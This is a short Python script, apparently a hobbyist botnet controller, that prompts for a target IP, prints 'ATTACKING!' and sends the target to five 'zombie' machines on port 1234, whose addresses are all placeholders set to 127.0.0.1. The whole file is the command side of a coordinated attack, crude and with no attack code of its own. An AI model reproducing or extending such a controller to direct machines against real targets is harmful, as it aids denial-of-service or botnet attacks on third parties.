#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:
#
# Author:      pat
#
# Created:     14/06/2013
# Copyright:   (c) pat 2013
# Licence:     <your licence>
#-------------------------------------------------------------------------------
IP = '127.0.0.1'
#client example
import socket
#zombie
IP = '127.0.0.1'
IP2 = '127.0.0.1'
IP3 = '127.0.0.1'
IP4 = '127.0.0.1'
IP5 = '127.0.0.1'

target = input("Target IP:")
target2 = target.encode('utf8')
print("ATTACKING!")
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP, 1234))
client_socket.send(target2)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP2, 1234))
client_socket.send(target2)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP3, 1234))
client_socket.send(target2)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP4, 1234))
client_socket.send(target2)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP5, 1234))
client_socket.send(target2)